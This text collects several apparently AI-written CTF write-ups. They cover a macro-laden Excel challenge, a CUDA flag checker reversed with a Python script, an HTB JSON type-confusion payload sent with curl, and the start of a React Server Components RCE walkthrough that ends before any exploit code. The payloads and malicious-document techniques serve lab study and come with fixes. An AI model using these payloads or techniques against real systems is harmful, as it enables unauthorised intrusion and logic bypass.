13. Decrypt .NET assembly
   ↓
14. Analisis assembly
   ↓
15. Recover FlagPart1
   ↓
16. Generate/baca flag.png
   ↓
17. Gabungkan flag
```

---

# 18. Kesalahan yang Hampir Terjadi

Flag sempat terbaca sebagai:

```text
CBC{b3w4r3_hidd3n_m4cr0s}
```

Namun itu salah.

Yang benar:

```text
CBC{b3w4r3_h1dd3n_m4cr0s}
```

Karakter `1` terlihat mirip dengan `i`.

Pelajaran penting:

```text
Selalu cek karakter ambigu:
1 vs i vs l
0 vs O
5 vs S
3 vs E
```

---

# 19. Security Lesson Learned

Challenge ini mengajarkan teknik yang sering dipakai pada dokumen berbahaya:

```text
1. Macro VBA auto-run
2. Sheet veryHidden
3. Payload disimpan di cell jauh
4. PowerShell EncodedCommand
5. String obfuscation dengan XOR
6. Environment-based execution
7. AES encrypted stage
8. Embedded .NET payload
9. Registry-based validation
10. Flag atau payload dipecah menjadi beberapa bagian
```

Dari sisi defense, beberapa mitigasi yang relevan:

```text
1. Disable macro dari file tidak terpercaya.
2. Blokir Office menjalankan PowerShell.
3. Monitor command seperti:
   powershell.exe -EncodedCommand
4. Deteksi akses cell ekstrem atau hidden sheet mencurigakan.
5. Scan VBA macro sebelum membuka dokumen.
6. Gunakan EDR untuk memantau Office spawning PowerShell.
7. Audit registry access dari proses Office atau child process-nya.
```

---

# 20. Final Writeup Summary

Challenge **Office** adalah reverse engineering berbasis dokumen Excel macro-enabled. Walaupun dari luar terlihat seperti salary guessing game, file ini menyimpan payload tersembunyi di sheet `Data` yang berstatus `veryHidden`.

Macro `Workbook_Open()` membaca payload dari cell paling ujung Excel, lalu menjalankan PowerShell dengan `-EncodedCommand`. Setelah didecode, PowerShell membuka beberapa stage terenkripsi AES. Payload hanya lanjut jika environment cocok, yaitu:

```text
COMPUTERNAME = WORK-PC
USERNAME     = Fischer
```

Setelah environment check dilewati, payload mendekripsi embedded `.NET assembly`. Assembly tersebut membaca `FlagPart1`, memvalidasi kombinasi environment, lalu menghasilkan file gambar `flag.png`.

Bagian pertama flag:

```text
CBC{b3w4r3
```

Bagian kedua dari gambar:

```text
_h1dd3n_m4cr0s}
```

Final flag:

```text
CBC{b3w4r3_h1dd3n_m4cr0s}
```

---

# Final Flag

```text
CBC{b3w4r3_h1dd3n_m4cr0s}
```


## CHAT 20
Betul, hasil sebelumnya **decoy / salah interpretasi**. Kesalahan utamanya: saya sebelumnya menganggap operasi CUDA `SHF` seperti operasi tambah/transform biasa, padahal setelah dibaca pakai `nvdisasm`, instruksinya adalah **funnel shift / rotate**.

## Flag yang benar

```text
CBC{Cc_uV_dAa___GPU!}
```

---

## Kenapa hasil sebelumnya salah?

Di kernel CUDA ada instruksi seperti ini:

```asm
SHF.R.W.U32
SHF.L.W.U32.HI
LOP3.LUT ..., 0x3c
LOP3.LUT ..., 0xc0
```

Interpretasi yang benar:

```text
LOP3.LUT 0x3c  = XOR
LOP3.LUT 0xc0  = AND / masking
SHF.R.W.U32    = rotate right
SHF.L.W.U32.HI = rotate left
```

Jadi checker bukan melakukan:

```text
add + xor
```

Tapi melakukan:

```text
rotate + xor
```

Itu alasan hasil pertama bisa terlihat “valid secara hex”, tapi flag-nya aneh/non-printable dan tidak accepted.

---

## Alur yang benar

### 1. Bongkar ZIP

Isi file:

```text
checker.exe
info.txt
```

`info.txt` memberi clue:

```text
NVIDIA GeForce RTX 3050 Ti Laptop GPU
CUDA 12.0
```

Jadi logika validasi flag kemungkinan berada di CUDA GPU code.

---

### 2. Cek host binary

Dari disassembly `checker.exe`, program mengecek:

```text
panjang input = 21 byte
prefix       = CBC{
suffix       = }
```

Berarti bentuk flag:

```text
CBC{................}
```

Isi tengahnya harus **16 byte**.

---

### 3. Ekstrak CUDA section

Di PE binary ada section CUDA:

```text
.nv_fatb
.nvFatBi
```

Setelah diekstrak, ada kernel:

```text
_Z9check_keyPKhPj
```

Ini fungsi GPU yang benar-benar memvalidasi flag.

---

### 4. Baca kernel CUDA dengan `nvdisasm`

Di dalam kernel ada konstanta penting:

```text
tr   = target akhir
kbf  = key buffer / round keys
rtbl = rotate table
```

Target yang harus dicapai:

```text
0x33082eb4
0xdc220d2a
0xa07965cf
0x1c8ef5a6
```

Input 16 byte di dalam `CBC{...}` dipotong menjadi 4 word 32-bit.

---

## Logic validasinya

Secara sederhana:

```python
x = input_word ^ previous_value
x = rotate(x)
x = x ^ key
x = x ^ 0x8008b00b
```

Dilakukan beberapa round.

Untuk word pertama, previous value-nya:

```text
0xb00b800b
```

Untuk word berikutnya, previous value-nya adalah target sebelumnya.

---

## Script solver

```python
import struct

MASK = 0xffffffff
C = 0x8008b00b

tr = [
    0x33082eb4,
    0xdc220d2a,
    0xa07965cf,
    0x1c8ef5a6,
]

kbf = [
    0x698467d2, 0x9bf2e306, 0xe7593332, 0x4cd9a184,
    0x29e3c269, 0x551795ed, 0x1826e245, 0xf5f70ffe,
    0x752a6fd7, 0x8b330f08, 0x1eaf14f0, 0x2cfcbc4e,
    0x228788b6, 0xb278b98b, 0xc8f85649, 0xd07c6850,
    0x1c54423f, 0x4a51c6ad, 0x0cbb811d, 0x2558ff7a,
    0x797ef6dd, 0x0740effe, 0x661fa07a, 0xc1d52a94,
]

rtbl = [
    20, 30, 18, 23, 12, 19,
    19, 24, 6, 25, 27, 11,
    13, 21, 26, 12, 30, 10,
    13, 23, 7, 25, 22, 28,
]

def rol(x, n):
    n &= 31
    return ((x << n) | (x >> (32 - n))) & MASK

def ror(x, n):
    n &= 31
    return ((x >> n) | (x << (32 - n))) & MASK

def inv_word(y, start):
    x = y

    for j in reversed(range(6)):
        i = start + j

        x ^= C
        x ^= kbf[i]
        x &= MASK

        if i % 2 == 0:
            x = rol(x, rtbl[i])
        else:
            x = ror(x, rtbl[i])

    return x

words = []

for block in range(4):
    start = block * 6
    x = inv_word(tr[block], start)

    if block == 0:
        word = x ^ 0xb00b800b
    else:
        word = x ^ tr[block - 1]

    words.append(word & MASK)

inner = b"".join(struct.pack("<I", w) for w in words)
flag = b"CBC{" + inner + b"}"

print(flag.decode())
```

Output:

```text
CBC{Cc_uV_dAa___GPU!}
```

---

## Inti pelajaran reverse engineering-nya

Challenge ini menjebak karena validasi flag ada di **GPU kernel**, bukan hanya di host `.exe`.

Checkpoint pentingnya:

```text
1. Jangan percaya strings saja
2. Cek section CUDA seperti .nv_fatb
3. Ekstrak cubin / ELF CUDA
4. Disassemble pakai nvdisasm
5. Pahami instruksi SASS, terutama LOP3 dan SHF
6. Balik operasi rotate + xor untuk dapat input asli
```

Flag final:

```text
CBC{Cc_uV_dAa___GPU!}
```


## CHAT 21
# Magical Palindrome Quest — HTB Web Challenge Writeup

## Executive Summary

This Hack The Box web challenge presents a simple “magical palindrome” application where the user is asked to submit a palindrome spell. At first glance, the application looks like a normal text-input challenge. However, after reviewing the source code, the real vulnerability becomes clear: the backend expects a string, but it never validates that the submitted `palindrome` value is actually a string.

The application also places a very small request body limit through Nginx:

```nginx
client_max_body_size 75;
```

Meanwhile, the backend requires the submitted value to have a length of at least `1000`:

```js
if (string.length < 1000) {
    return 'Tootus Shortus';
}
```

A normal 1000-character string cannot fit inside the 75-byte request limit. This conflict is the main clue. The intended solution is to abuse JavaScript type confusion and type coercion by sending a JSON object instead of a normal string.

Final payload:

```bash
curl -i -s -X POST 'http://154.57.164.66:30540/' \
  -H 'Content-Type: application/json' \
  --data-raw '{"palindrome":{"length":"1000","0":"a","999":"a"}}'
```

This payload tricks the backend into believing the input is long enough and passes the palindrome check, causing the server to return the flag.

---

## Challenge Information

| Field | Details |
|---|---|
| Platform | Hack The Box |
| Category | Web |
| Challenge Name | Magical Palindrome Quest |
| Target | `154.57.164.66:30540` |
| Provided File | Password-protected ZIP |
| ZIP Password | `hackthebox` |
| Main Vulnerability | JSON Object Injection / JavaScript Type Confusion |
| Root Cause | Missing type validation before using `.length` and index-based access |
| Impact | Authentication/logic bypass leading to flag disclosure |

---

## Scenario

> In Dumbledore's absence, Harry's memory fades, leaving crucial words lost. Delve into the arcane world, harness the power of JSON, and unveil the hidden spell to restore his recollection. Can you help Harry find the path to salvation?

The scenario hints at two important ideas:

1. **“Harness the power of JSON”** — the input format matters.
2. **“Find path to salvation”** — the solution is not just typing a normal palindrome into the form.

This means the challenge is likely about manipulating how the backend receives and interprets data.

---

## Ethical Scope

This writeup is created for an authorized Hack The Box lab environment. The techniques described here are intended for learning, defensive understanding, and CTF practice only.

Do not test these techniques against systems you do not own or do not have permission to assess.

---

# 1. Initial Reconnaissance

## Goal

Understand how the application works from the browser side.

## What Was Observed

The frontend contains a single form:

```html
<form id="form" oninput="result.textContent = ''">
    <input name="palindrome" type="text" placeholder="Enter your magical palindrome">
    <button type="submit">Cast Spell</button>
</form>
```

The JavaScript sends the form value to the backend using `fetch()`:

```js
const palindrome = new FormData(form).get('palindrome');
const res = await fetch('/', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({palindrome}),
});
```

## Key Findings

The request is sent to:

```http
POST /
```

The content type is:

```http
Content-Type: application/json
```

The normal request body looks like this:

```json
{"palindrome":"radar"}
```

## Why This Step Matters

The frontend tells us how the browser communicates with the backend. In web CTFs, this is one of the first things to identify because the visible page is only the interface. The real target is usually the HTTP request.

### Simple Analogy

Imagine the website is a restaurant menu and the backend is the kitchen. The button on the website is like a waiter delivering your order. By reading the frontend code, we learn exactly what order is being sent to the kitchen.

Once we know the request format, we can send our own custom order directly with `curl`.

## Checkpoint 1 — Progression

| Checkpoint | Result |
|---|---|
| What endpoint receives the input? | `POST /` |
| What format is used? | JSON |
| What parameter is important? | `palindrome` |
| What can we do next? | Send custom requests manually with `curl` |

---

# 2. Testing a Normal Palindrome

## Goal

Confirm how the server responds to a normal valid-looking palindrome.

Example test:

```bash
curl -s -X POST 'http://154.57.164.66:30540/' \
  -H 'Content-Type: application/json' \
  --data-raw '{"palindrome":"radar"}'
```

Possible response:

```text
Tootus Shortus
```

## Interpretation

The word `radar` is a palindrome, but the server still rejects it because it is too short.

This tells us the application is not only checking whether the word reads the same forward and backward. It also checks the length.

## Why This Step Matters

Testing a simple payload helps us understand the server’s validation flow. Instead of guessing immediately, we collect feedback from the application.

### Simple Analogy

If a teacher rejects your answer, the reason matters. If the teacher says, “Too short,” then the issue is not necessarily that your answer is wrong. The issue is that it does not satisfy a length requirement.

## Checkpoint 2 — Progression

| Checkpoint | Result |
|---|---|
| Was a normal palindrome accepted? | No |
| Error message | `Tootus Shortus` |
| Meaning | Input length is too short |
| What can we do next? | Review backend source code to identify the exact rule |

---

# 3. Source Code Review

## Goal

Find the backend validation logic.

The important backend file is:

```text
app/index.mjs
```

Relevant code:

```js
const IsPalinDrome = (string) => {
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }

    for (const i of Array(string.length).keys()) {
        const original = string[i];
        const reverse = string[string.length - i - 1];

        if (original !== reverse || typeof original !== 'string') {
            return 'Notter Palindromer!!';
        }
    }

    return null;
}
```

The route handler receives JSON data:

```js
app.post('/', async (c) => {
    const {palindrome} = await c.req.json();
    const error = IsPalinDrome(palindrome);
    if (error) {
        c.status(400);
        return c.text(error);
    }
    return c.text(`Hii Harry!!! ${flag}`);
});
```

## What the Backend Tries to Do

The function tries to:

1. Check if the input length is at least `1000`.
2. Loop through the input.
3. Compare each character from the front with the matching character from the back.
4. Reject the input if the values do not match.
5. Return the flag if everything passes.

## The Important Weakness

The backend never checks that `palindrome` is actually a string.

There is no validation like this:

```js
if (typeof palindrome !== 'string') {
    return 'Invalid input type';
}
```

This is the core vulnerability.

## Why This Step Matters

The function name and parameter name suggest the input should be a string, but JavaScript does not enforce that automatically. If the developer does not validate the type, an attacker can send a different JSON type, such as an object.

### Simple Analogy

Imagine a security guard expects every visitor to show a paper ticket. The guard does not check whether the visitor actually gave a ticket. The visitor could hand over a small box with labels on it, and the guard might still try to read it like a ticket.

That is what happens here. The backend expects a string, but we can send an object.

## Checkpoint 3 — Progression

| Checkpoint | Result |
|---|---|
| Where is the validation? | `IsPalinDrome()` in `index.mjs` |
| Required length | At least `1000` |
| Is type validation present? | No |
| Main weakness | Backend assumes the input is a string |
| What can we do next? | Try sending a JSON object instead of a string |

---

# 4. Discovering the Request Size Constraint

## Goal

Identify why sending a normal 1000-character palindrome will not work.

The Nginx configuration contains:

```nginx
client_max_body_size 75;
```

This means the request body must be very small.

## Why This Is Important

The backend requires:

```text
length >= 1000
```

But Nginx allows only:

```text
maximum request body size = 75 bytes
```

A real 1000-character string cannot fit in 75 bytes.

Example impossible approach:

```json
{"palindrome":"aaaaaaaaaaaaaaaaaaaaaaaa...1000 times...aaaaaaaa"}
```

That request would be much larger than 75 bytes and would be blocked before reaching the Node.js backend.

## The Conflict

| Component | Rule |
|---|---|
| Nginx | Request body must be tiny, max 75 bytes |
| Backend | `palindrome.length` must be at least 1000 |

This conflict is the challenge’s main clue.

## Simple Analogy

There are two guards:

1. The outside guard, Nginx, says: “Your bag must be smaller than 75 units.”
2. The inside guard, Node.js, says: “Your spell must be at least 1000 letters long.”

If we bring a real 1000-letter spell, the outside guard rejects us.

So we need a small object that convinces the inside guard that it represents a 1000-letter spell.

## Checkpoint 4 — Progression

| Checkpoint | Result |
|---|---|
| Can we send a real 1000-character string? | No |
| Why not? | Nginx body limit is 75 bytes |
| What does this suggest? | The intended solution is a logic/type trick |
| What can we do next? | Abuse JSON and JavaScript type behavior |

---

# 5. Understanding the Vulnerability

## Vulnerability Type

This challenge demonstrates:

```text
JSON Object Injection + JavaScript Type Confusion + Type Coercion
```

## What Is Type Confusion?

Type confusion happens when the program expects one type of data but receives another type and still tries to process it.

In this case, the backend expects:

```json
{"palindrome":"some string"}
```

But we send:

```json
{"palindrome":{"length":"1000","0":"a","999":"a"}}
```

The value of `palindrome` is now an object, not a string.

## Why This Works

JavaScript objects can have properties such as:

```js
{
    length: "1000",
    0: "a",
    999: "a"
}
```

So when the backend executes:

```js
string.length
```

It receives:

```js
"1000"
```

Even though the input is not a real string of 1000 characters.

## Simple Analogy

The backend asks:

> “How long is your spell?”

Instead of giving a long spell, we give a tiny note that says:

> “My spell length is 1000.”

Because the backend does not verify the input type, it believes the note.

## Checkpoint 5 — Progression

| Checkpoint | Result |
|---|---|
| Can JSON carry non-string data? | Yes |
| Can `palindrome` be an object? | Yes |
| Can an object have a fake `length` property? | Yes |
| What can we do next? | Craft an object that passes the backend checks |

---

# 6. Building the Exploit Step by Step

## Step 1 — Fake the Length

We start with:

```json
{"palindrome":{"length":"1000"}}
```

The backend runs:

```js
if (string.length < 1000)
```

Because `string.length` is now:

```js
"1000"
```

JavaScript compares:

```js
"1000" < 1000
```

During comparison, JavaScript converts the string value `"1000"` into the number `1000`.

So the check becomes:

```js
1000 < 1000
```

This is false, so the input is not rejected as too short.

## Why Use `"1000"` as a String Instead of `1000` as a Number?

This is the most important trick in the challenge.

If we send:

```json
{"length":1000}
```

Then the backend later runs:

```js
Array(string.length)
```

That becomes:

```js
Array(1000)
```

This creates an array with 1000 indexes, causing the loop to run 1000 times.

But if we send:

```json
{"length":"1000"}
```

Then the backend runs:

```js
Array("1000")
```

This creates an array with one element, not an array of length 1000.

This means the loop only runs once.

## Simple Analogy

There is a huge difference between:

```text
Build 1000 boxes.
```

and:

```text
Build one box labeled "1000".
```

`Array(1000)` means “make 1000 empty slots.”

`Array("1000")` means “make one slot containing the text `1000`.”

## Checkpoint 6 — Progression

| Checkpoint | Result |
|---|---|
| Fake length used | `"1000"` |
| Why not number `1000`? | It would make the loop run 1000 times |
| Why string `"1000"`? | It passes the length comparison but makes `Array("1000")` loop once |
| What can we do next? | Satisfy the one loop iteration |

---

# 7. Passing the Palindrome Loop

The loop is:

```js
for (const i of Array(string.length).keys()) {
    const original = string[i];
    const reverse = string[string.length - i - 1];

    if (original !== reverse || typeof original !== 'string') {
        return 'Notter Palindromer!!';
    }
}
```

Because we used:

```json
"length":"1000"
```

The loop becomes:

```js
for (const i of Array("1000").keys())
```

`Array("1000")` only has one key:

```text
0
```

So the loop only runs once with:

```js
i = 0
```

Now calculate the values checked by the backend.

## First Value: `original`

```js
const original = string[i];
```

Since `i = 0`:

```js
original = string[0];
```

So we need to provide:

```json
"0":"a"
```

## Second Value: `reverse`

```js
const reverse = string[string.length - i - 1];
```

Substitute the values:

```js
reverse = string["1000" - 0 - 1];
```

JavaScript converts `"1000"` into `1000` during subtraction:

```js
reverse = string[999];
```

So we need to provide:

```json
"999":"a"
```

Now both values match:

```js
original = "a";
reverse = "a";
```

The condition becomes:

```js
if ("a" !== "a" || typeof "a" !== "string")
```

Which becomes:

```js
if (false || false)
```

The check passes.

## Checkpoint 7 — Progression

| Checkpoint | Result |
|---|---|
| How many times does the loop run? | Once |
| Which index is checked first? | `0` |
| Which reverse index is checked? | `999` |
| Required values | `0` and `999` must be equal strings |
| Final object properties | `"0":"a"`, `"999":"a"` |

---

# 8. Final Payload

The final payload is:

```json
{"palindrome":{"length":"1000","0":"a","999":"a"}}
```

Send it using `curl`:

```bash
curl -i -s -X POST 'http://154.57.164.66:30540/' \
  -H 'Content-Type: application/json' \
  --data-raw '{"palindrome":{"length":"1000","0":"a","999":"a"}}'
```

Expected successful response:

```text
Hii Harry!!! HTB{...}
```

The local source file contains a fake test flag:

```text
HTB{FAKE_FLAG_FOR_TESTING}
```

The remote HTB instance returns the real challenge flag.

---

# 9. Full Attack Flow

```text
1. Open the web application.
2. Inspect the frontend source.
3. Identify that the form sends JSON to POST /.
4. Test a normal palindrome such as "radar".
5. Observe that the server rejects it as too short.
6. Review backend source code.
7. Find that the backend checks .length >= 1000.
8. Notice that no type validation is performed.
9. Review Nginx config.
10. Find client_max_body_size 75.
11. Realize a real 1000-character string cannot be sent.
12. Look for a way to make a small JSON body appear long.
13. Send palindrome as an object instead of a string.
14. Set object property length to "1000".
15. Use JavaScript type coercion to pass the length check.
16. Use Array("1000") behavior to make the loop run once.
17. Provide matching values at indexes 0 and 999.
18. Receive the flag.
```

---

# 10. Checkpoint-Based Methodology

| Stage | Question Asked | Finding | Progression |
|---|---|---|---|
| Frontend Recon | How is data submitted? | JSON to `POST /` | We can send custom JSON manually |
| Basic Testing | Does a normal palindrome work? | No, too short | Need to inspect length validation |
| Source Review | What does backend require? | `.length >= 1000` | Need long-looking input |
| Config Review | Can we send 1000 characters? | No, body limit is 75 bytes | Need bypass, not brute force |
| Type Analysis | Does backend validate type? | No | Try object instead of string |
| Payload Design | How to fake length? | Add object property `length` | Backend reads fake length |
| Loop Analysis | How many checks happen? | `Array("1000")` loops once | Only need index `0` and `999` |
| Exploitation | What values are needed? | Both must equal string values | Send `"0":"a"` and `"999":"a"` |
| Result | Did the payload pass? | Yes | Flag returned |

---

# 11. Root Cause Analysis

## Primary Root Cause

The backend trusts user-controlled JSON without validating the expected type.

Vulnerable pattern:

```js
const {palindrome} = await c.req.json();
const error = IsPalinDrome(palindrome);
```

The function assumes `palindrome` is a string:

```js
const IsPalinDrome = (string) => {
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }
```

But user-controlled JSON can provide:

```json
{
  "palindrome": {
    "length": "1000",
    "0": "a",
    "999": "a"
  }
}
```

## Secondary Root Cause

JavaScript type coercion is used implicitly.

Examples:

```js
"1000" < 1000
```

JavaScript treats this like:

```js
1000 < 1000
```

And:

```js
"1000" - 0 - 1
```

JavaScript treats this like:

```js
1000 - 0 - 1
```

This automatic conversion helps the malicious object pass the validation logic.

## Tertiary Root Cause

The code uses:

```js
Array(string.length)
```

This behaves differently depending on whether `string.length` is a number or a string.

```js
Array(1000)
```

Creates an array with length 1000.

```js
Array("1000")
```

Creates an array with one element.

This difference allows the attacker to shrink the validation loop to a single check.

---

# 12. Impact

In this CTF challenge, the impact is flag disclosure.

In a real-world application, this class of vulnerability could lead to:

- Business logic bypass
- Authentication or authorization bypass
- Validation bypass
- Incorrect security decisions
- Unexpected application behavior
- Possible denial of service if malformed data causes crashes

The severity depends on what the validation protects. If this pattern appears in authentication, payment, access control, or role validation logic, the impact could be critical.

---

# 13. How to Fix the Vulnerability

## Fix 1 — Validate the Input Type First

The simplest fix is to check that the input is actually a string before using `.length`.

```js
const IsPalinDrome = (input) => {
    if (typeof input !== 'string') {
        return 'Invalid input type';
    }

    if (input.length < 1000) {
        return 'Tootus Shortus';
    }

    for (const i of Array(input.length).keys()) {
        const original = input[i];
        const reverse = input[input.length - i - 1];

        if (original !== reverse) {
            return 'Notter Palindromer!!';
        }
    }

    return null;
}
```

This blocks the malicious object because:

```js
typeof { length: "1000" }
```

returns:

```text
object
```

not:

```text
string
```

## Fix 2 — Use Schema Validation

A better production-grade approach is to validate the request body with a schema validator such as Zod, Joi, Yup, or a similar library.

Example concept with Zod:

```js
import { z } from 'zod';

const schema = z.object({
    palindrome: z.string().min(1000)
});

app.post('/', async (c) => {
    const body = await c.req.json();
    const parsed = schema.safeParse(body);

    if (!parsed.success) {
        c.status(400);
        return c.text('Invalid request body');
    }

    const { palindrome } = parsed.data;
    const error = IsPalinDrome(palindrome);

    if (error) {
        c.status(400);
        return c.text(error);
    }

    return c.text(`Hii Harry!!! ${flag}`);
});
```

## Fix 3 — Avoid Ambiguous Type Coercion

Use explicit type checks and avoid relying on JavaScript automatic conversions.

Bad:

```js
if (input.length < 1000) {
```

Better:

```js
if (typeof input !== 'string') {
    return 'Invalid input type';
}

if (input.length < 1000) {
    return 'Too short';
}
```

## Fix 4 — Use Safer Looping Logic

Instead of:

```js
for (const i of Array(input.length).keys()) {
```

Use a clear numeric loop:

```js
for (let i = 0; i < input.length; i++) {
```

This is easier to read and reason about.

Even with this change, type validation is still required.

---

# 14. Secure Version Example

```js
const IsPalinDrome = (input) => {
    if (typeof input !== 'string') {
        return 'Invalid input type';
    }

    if (input.length < 1000) {
        return 'Tootus Shortus';
    }

    for (let i = 0; i < input.length; i++) {
        const original = input[i];
        const reverse = input[input.length - i - 1];

        if (original !== reverse) {
            return 'Notter Palindromer!!';
        }
    }

    return null;
}
```

This version is safer because:

1. It rejects non-string input.
2. It avoids object-based fake `length` values.
3. It avoids relying on `Array(input.length)` behavior.
4. It makes the palindrome loop easier to understand.

---

# 15. Best Practices

## Input Validation

Always validate:

- Required fields
- Data types
- Minimum and maximum length
- Allowed characters
- Object structure
- Nested properties

## Never Trust Client-Side Behavior

The frontend may only allow text input, but attackers can bypass the browser and send custom HTTP requests.

Client-side validation is useful for user experience, but security validation must happen on the server.

## Use Schema-Based Validation

Use tools like:

- Zod
- Joi
- Yup
- Ajv
- Valibot

Schema validation helps prevent unexpected types from reaching business logic.

## Be Careful With JavaScript Type Coercion

JavaScript may automatically convert values in ways that are surprising.

Examples:

```js
"1000" < 1000
"1000" - 1
Array("1000")
Array(1000)
```

These can behave very differently depending on context.

## Validate Before Processing

Do not process user input first and validate later.

Correct order:

```text
1. Parse input
2. Validate structure and type
3. Apply business logic
4. Return response
```

## Keep Server Limits Aligned With Business Logic

The Nginx limit and backend requirement created a suspicious mismatch:

```text
Nginx: max body 75 bytes
Backend: input length must be 1000
```

In real systems, limits should be consistent and intentional. If a backend requires large input, the proxy should allow it. If the proxy only allows small input, the backend should not require impossible payload sizes.

---

# 16. Lesson Learned

## Technical Lessons

1. JSON can carry more than strings.
2. Backend code must not assume client-side input types.
3. JavaScript objects can mimic string-like properties such as `length`.
4. Type coercion can turn strings into numbers depending on the operation.
5. `Array(1000)` and `Array("1000")` behave differently.
6. Small configuration details, such as body size limits, can be major exploitation clues.

## CTF Methodology Lessons

1. Start by understanding the request flow.
2. Test normal behavior first.
3. Read the source code carefully.
4. Compare frontend expectations with backend validation.
5. Look for contradictions between components.
6. Treat strange constraints as hints.
7. Build the exploit from the validation logic, not by random guessing.

## Defensive Lessons

1. Validate server-side input types strictly.
2. Use schema validation for JSON APIs.
3. Avoid relying on JavaScript implicit conversions.
4. Write clear validation logic.
5. Assume attackers can send any valid JSON structure, not only what the frontend form produces.

---

# 17. Why This Challenge Is Interesting

This challenge is valuable because the bug is not based on a complex exploit chain. It is based on a very common real-world mistake:

```text
The developer trusted the shape of user input.
```

The frontend sends a string, so the backend developer assumed the backend would always receive a string.

But an attacker does not have to use the frontend.

An attacker can directly send JSON like this:

```json
{"palindrome":{"length":"1000","0":"a","999":"a"}}
```

This is why backend validation is critical.

---

# 18. Final Notes

The successful exploitation path was not about finding a real 1000-character palindrome. The real path was recognizing that a normal 1000-character string was impossible because of the Nginx request size limit.

That contradiction forced a different approach:

```text
If we cannot send 1000 characters,
how can we make the backend believe the input has length 1000?
```

The answer was:

```text
Send a JSON object with a fake length property.
```

Then, by making `length` a string instead of a number, the payload also reduced the validation loop to a single iteration.

This is the full trick:

```json
{"palindrome":{"length":"1000","0":"a","999":"a"}}
```

It is small enough for Nginx, valid enough for the backend, and carefully shaped to pass the palindrome check.

---

# 19. References for Further Study

Recommended topics to study after this challenge:

- JavaScript type coercion
- JSON API security
- Server-side input validation
- Schema validation with Zod or Joi
- Business logic vulnerabilities
- Node.js secure coding practices
- Proxy and backend configuration alignment

---

## Final Takeaway

The most important lesson from this challenge is:

> Never trust that user input has the type, shape, or structure that the frontend suggests.

Always validate input on the server before using it in security-sensitive or business-critical logic.


## CHAT 22
# HTB Web Challenge Writeup: ReactOOPS / NexusAI

> **Category:** Web Exploitation  
> **Platform:** Hack The Box Labs  
> **Difficulty Style:** Framework Vulnerability / RCE  
> **Vulnerability:** React Server Components Remote Code Execution  
> **CVE:** CVE-2025-55182  
> **Impact:** Unauthenticated Remote Code Execution  
> **Flag:** `HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}`

---

## 1. Challenge Scenario

The challenge introduces a polished AI assistant platform named **NexusAI**.

> NexusAI's polished assistant interface promises adaptive learning and seamless interaction. But beneath its reactive front end, subtle glitches hint that user input may be shaping the system in unexpected ways. Explore the platform, trace the echoes in its reactive layer, and uncover the hidden flaw buried behind the UI.

At first glance, the application looks like a simple landing page for a personal AI assistant. There are marketing sections, buttons such as **Get Started**, **Start Free Trial**, and **Watch Demo**, but no obvious login form, upload feature, or traditional input field.

The important hint from the scenario is:

```text
reactive front end
reactive layer
user input may be shaping the system
```

This strongly suggests that the issue may not be in normal application logic, but in the **React / Next.js rendering layer**.

---

## 2. Initial Target Check

After starting the HTB instance, the target was available at:

```bash
http://154.57.164.76:31532
```

I first checked whether the target was alive:

```bash
export TARGET="http://154.57.164.76:31532"
curl -sS -D - -o /dev/null "$TARGET/" | head
```

The response:

```http
HTTP/1.1 200 OK
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
```

### Why this step matters

Before exploiting anything, we must confirm three things:

1. The target is reachable.
2. The technology stack matches our hypothesis.
3. The application exposes behavior related to React Server Components.

The most important headers are:

```http
X-Powered-By: Next.js
Vary: rsc, next-router-state-tree, ...
```

`X-Powered-By: Next.js` confirms that the application uses Next.js.

`Vary: rsc` indicates the presence of **React Server Components** behavior. This is very important because the challenge hints at a flaw in the reactive layer.

---

## 3. Frontend Inspection

Using browser DevTools, the page source showed assets such as:

```html
/_next/static/chunks/...
/_next/static/chunks/turbopack-...
```

It also contained React Flight data similar to:

```javascript
self.__next_f.push(...)
```

### What this means

This confirms the application is not a classic static HTML site. It is a modern **Next.js App Router** application using React internals.

At this point, I avoided wasting too much time on the visible buttons because they did not appear to trigger meaningful business logic.

The UI was most likely a decoy.

---

## 4. Source Code Review

The challenge also provided a ZIP file protected with the password:

```text
hackthebox
```

After extracting the ZIP:

```bash
unzip -P hackthebox ReactOOPS.zip
cd web_reactoops/challenge
```

I listed the files:

```bash
find . -maxdepth 3 -type f | sort
```

Important files included:

```text
app/page.tsx
app/layout.tsx
package.json
next.config.mjs
flag.txt
Dockerfile
```

---

## 5. Reviewing `package.json`

The most important discovery was inside `package.json`:

```json
{
  "name": "react2shell",
  "dependencies": {
    "next": "16.0.6",
    "react": "^19",
    "react-dom": "^19"
  }
}
```

### Why this is important

The project name itself is a huge hint:

```text
react2shell
```

This suggests a vulnerability that turns React behavior into shell command execution.

The dependency versions are also suspicious:

```text
Next.js 16.0.6
React 19
React DOM 19
```

This combination points to a known React Server Components vulnerability:

```text
CVE-2025-55182
```

The vulnerability is commonly referred to as **React2Shell**.

---

## 6. Reviewing the Dockerfile

Next, I checked the Dockerfile because CTF challenges often reveal where the flag is stored.

The important part:

```dockerfile
COPY challenge/flag.txt /app/flag.txt
```

This tells us that the flag on the running server should be located at:

```bash
/app/flag.txt
```

### Why this step matters

Instead of blindly searching the filesystem, we use the deployment configuration to determine the exact flag path.

This is cleaner, faster, and more professional.

The goal becomes:

```bash
cat /app/flag.txt
```

But to run that command, we first need Remote Code Execution.

---

## 7. Vulnerability Hypothesis

At this point, the evidence was:

| Evidence | Meaning |
|---|---|
| `X-Powered-By: Next.js` | Target uses Next.js |
| `Vary: rsc` | React Server Components behavior is present |
| `self.__next_f.push(...)` | React Flight stream detected |
| Project name: `react2shell` | Hint toward React RCE |
| Next.js `16.0.6` | Vulnerable version range |
| Flag path in Dockerfile | Target file is `/app/flag.txt` |

So the likely vulnerability was:

```text
Unauthenticated Remote Code Execution through React Server Components / Server Action processing
```

In simple terms:

> The server accepts special React internal data from the client. Because of a framework-level bug, a maliciously crafted request can cause the server to execute JavaScript/Node.js code.

---

## 8. Why Not Test SQLi, XSS, or JWT First?

The application did not expose traditional attack surfaces:

- No login page
- No search feature
- No obvious API endpoint
- No file upload
- No JWT-based authentication
- No visible user-controlled input

The challenge hints and source code pointed directly toward a framework-level issue.

